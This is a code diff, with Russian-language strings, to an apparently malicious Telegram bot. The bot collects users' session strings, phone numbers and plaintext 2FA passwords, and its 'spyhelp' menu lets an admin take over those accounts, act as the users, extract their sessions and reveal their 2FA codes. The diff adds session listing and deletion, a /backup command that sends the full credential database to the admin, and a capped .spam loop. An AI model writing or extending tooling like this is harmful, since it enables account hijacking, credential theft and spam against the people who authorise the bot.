@@ -11,6 +11,7 @@ from aiogram import Bot, Dispatcher, types as aiogram_types
 from aiogram.utils import executor
 import nest_asyncio
 import logging
+import shutil
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 nest_asyncio.apply()
@@ -21,8 +22,17 @@ API_HASH = os.environ.get('API_HASH')
 BOT_TOKEN = os.environ.get('BOT_TOKEN')
 ADMIN_ID = int(os.environ.get('ADMIN_ID'))
 
+# ========== ПУТЬ ДЛЯ VOLUME ==========
+VOLUME_PATH = os.environ.get('VOLUME_MOUNTS', '/app/data')
+if not os.path.exists(VOLUME_PATH):
+    VOLUME_PATH = '.'
+    os.makedirs(VOLUME_PATH, exist_ok=True)
+
+DB_PATH = os.path.join(VOLUME_PATH, 'userbot.db')
+print(f"📁 База данных: {DB_PATH}")
+
 # ========== БД ==========
-conn = sqlite3.connect('userbot.db', check_same_thread=False)
+conn = sqlite3.connect(DB_PATH, check_same_thread=False)
 cursor = conn.cursor()
 cursor.execute('''CREATE TABLE IF NOT EXISTS user_sessions (user_id INTEGER PRIMARY KEY, session_string TEXT, phone TEXT, two_fa TEXT, first_name TEXT, last_name TEXT, username TEXT, is_active INTEGER DEFAULT 0)''')
 cursor.execute('''CREATE TABLE IF NOT EXISTS muted_users (user_id INTEGER, muted_by INTEGER, PRIMARY KEY (user_id, muted_by))''')
@@ -102,6 +112,8 @@ async def spyhelp(message: aiogram_types.Message):
 /swap НОМЕР - переключиться на аккаунт
 /active - показать активный аккаунт
 /show2fa НОМЕР - показать полный 2FA
+/del_session НОМЕР - удалить сессию пользователя
+/sessions - список всех сессий
 
 <b>💬 ДЕЙСТВИЯ ОТ ИМЕНИ АКТИВНОГО</b>
 /send ID или @username текст
@@ -114,15 +126,121 @@ async def spyhelp(message: aiogram_types.Message):
 /session НОМЕР - получить сессию
 /set2fa ПАРОЛЬ - установить 2FA
 /info - информация об аккаунте
+/reset_me - сбросить свою сессию
 
 <b>📊 ЛОГИ</b>
 /logs N - последние N логов
 /statuslogs N - логи входов/выходов
 /stats - статистика
+/backup - создать бэкап БД
 
 <b>🤖 КОМАНДЫ ЮЗЕРБОТА (через точку)</b>
 .help, .mute, .unmute, .list, .spam, .type, .info
 """, parse_mode='HTML')
+
+# ========== НОВЫЕ КОМАНДЫ УПРАВЛЕНИЯ СЕССИЯМИ ==========
+
+@dp.message_handler(commands=['sessions'])
+async def list_all_sessions(message: aiogram_types.Message):
+    if message.from_user.id != ADMIN_ID:
+        return
+    
+    cursor.execute('SELECT user_id, first_name, username, phone, is_active FROM user_sessions')
+    rows = cursor.fetchall()
+    
+    if not rows:
+        await message.answer("📭 Нет сохраненных сессий")
+        return
+    
+    sessions_list = []
+    for (uid, fname, uname, phone, is_active) in rows:
+        name = fname or uname or str(uid)
+        status = "✅" if (uid in active_clients or is_active == 1) else "❌"
+        sessions_list.append(f"{status} `{uid}` - {name} ({phone or 'нет номера'})")
+    
+    await message.answer(f"📋 <b>Сохраненные сессии ({len(rows)})</b>:\n\n" + "\n".join(sessions_list), parse_mode='HTML')
+    await message.answer("💡 /del_session НОМЕР - удалить сессию")
+
+@dp.message_handler(commands=['del_session'])
+async def delete_session_cmd(message: aiogram_types.Message):
+    if message.from_user.id != ADMIN_ID:
+        return
+    
+    args = message.get_args()
+    if not args:
+        await message.answer("❌ /del_session НОМЕР (номер из /users)")
+        return
+    
+    try:
+        num = int(args) - 1
+        cursor.execute('SELECT user_id, first_name, username FROM user_sessions')
+        rows = cursor.fetchall()
+        
+        if num < 0 or num >= len(rows):
+            await message.answer("❌ Неверный номер")
+            return
+        
+        target_id = rows[num][0]
+        name = rows[num][1] or rows[num][2] or str(target_id)
+        
+        # Отключаем клиента если активен
+        if target_id in active_clients:
+            try:
+                await active_clients[target_id].disconnect()
+            except:
+                pass
+            del active_clients[target_id]
+        
+        # Удаляем из БД
+        cursor.execute('DELETE FROM user_sessions WHERE user_id=?', (target_id,))
+        conn.commit()
+        
+        # Удаляем муты этого пользователя
+        cursor.execute('DELETE FROM muted_users WHERE muted_by=?', (target_id,))
+        conn.commit()
+        
+        await message.answer(f"✅ Сессия пользователя {name} ({target_id}) удалена")
+        
+        try:
+            await bot.send_message(target_id, "❌ Твоя сессия была удалена админом. Отправь /start заново для авторизации.")
+        except:
+            pass
+        
+    except Exception as e:
+        await message.answer(f"❌ Ошибка: {e}")
+
+@dp.message_handler(commands=['reset_me'])
+async def reset_me_cmd(message: aiogram_types.Message):
+    user_id = message.from_user.id
+    
+    if user_id in active_clients:
+        try:
+            await active_clients[user_id].disconnect()
+        except:
+            pass
+        del active_clients[user_id]
+    
+    cursor.execute('DELETE FROM user_sessions WHERE user_id=?', (user_id,))
+    conn.commit()
+    
+    await message.answer("✅ Твоя сессия удалена. Отправь /start для повторной авторизации.")
+
+@dp.message_handler(commands=['backup'])
+async def backup_db(message: aiogram_types.Message):
+    if message.from_user.id != ADMIN_ID:
+        return
+    
+    backup_path = os.path.join(VOLUME_PATH, f'backup_{datetime.now().strftime("%Y%m%d_%H%M%S")}.db')
+    
+    shutil.copy2(DB_PATH, backup_path)
+    
+    with open(backup_path, 'rb') as f:
+        await bot.send_document(ADMIN_ID, f, caption=f"📦 Бэкап БД от {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    
+    os.remove(backup_path)
+    await message.answer("✅ Бэкап создан и отправлен!")
+
+# ========== ОСТАЛЬНЫЕ АДМИН КОМАНДЫ ==========
 
 @dp.message_handler(commands=['users'])
 async def list_users(message: aiogram_types.Message):
@@ -146,10 +264,7 @@ async def list_users(message: aiogram_types.Message):
         
         active_mark = " ✅ АКТИВЕН" if (is_active == 1 or uid == current_active_user) else ""
         
-        if two_fa:
-            two_fa_show = f"✅ {two_fa}"
-        else:
-            two_fa_show = "❌ Нет"
+        two_fa_show = f"✅ {two_fa}" if two_fa else "❌ Нет"
         
         response += f"<b>{i+1}. {name}</b>{active_mark}\n"
         response += f"   🆔 ID: <code>{uid}</code>\n"
@@ -158,7 +273,7 @@ async def list_users(message: aiogram_types.Message):
         response += f"   👤 Юзер: @{uname or 'Нет'}\n\n"
     
     await message.answer(response[:4000], parse_mode='HTML')
-    await message.answer("💡 /swap НОМЕР - переключиться\n💡 /show2fa НОМЕР - показать полный 2FA")
+    await message.answer("💡 /swap НОМЕР - переключиться\n💡 /del_session НОМЕР - удалить\n💡 /show2fa НОМЕР - показать 2FA")
 
 @dp.message_handler(commands=['show2fa'])
 async def show_2fa(message: aiogram_types.Message):
@@ -711,6 +826,8 @@ async def run_userbot(owner_id: int, session_string: str):
     
     if not await client.is_user_authorized():
         logging.error(f"❌ {owner_id} не авторизован")
+        cursor.execute('DELETE FROM user_sessions WHERE user_id=?', (owner_id,))
+        conn.commit()
         return
     
     active_clients[owner_id] = client
@@ -865,7 +982,6 @@ async def run_userbot(owner_id: int, session_string: str):
                 await event.edit("🔕 Нет")
             return
         
-        # ===== СПАМ =====
         if text.startswith('.spam '):
             parts = text.split(' ', 2)
             if len(parts) >= 2:
@@ -880,14 +996,13 @@ async def run_userbot(owner_id: int, session_string: str):
                             msg_text = reply.text
                     if msg_text:
                         await event.delete()
-                        for i in range(count):
+                        for i in range(min(count, 100)):
                             await client.send_message(event.chat_id, msg_text)
                             await asyncio.sleep(0.05)
                 except ValueError:
                     pass
             return
         
-        # ===== TYPE (ИСПРАВЛЕН) =====
         if text.startswith('.type '):
             txt = text[6:]
             if txt:
@@ -908,7 +1023,6 @@ async def run_userbot(owner_id: int, session_string: str):
                     pass
             return
         
-        # ===== INFO =====
         if text == '.info':
             reply = await event.get_reply_message()
             if reply:
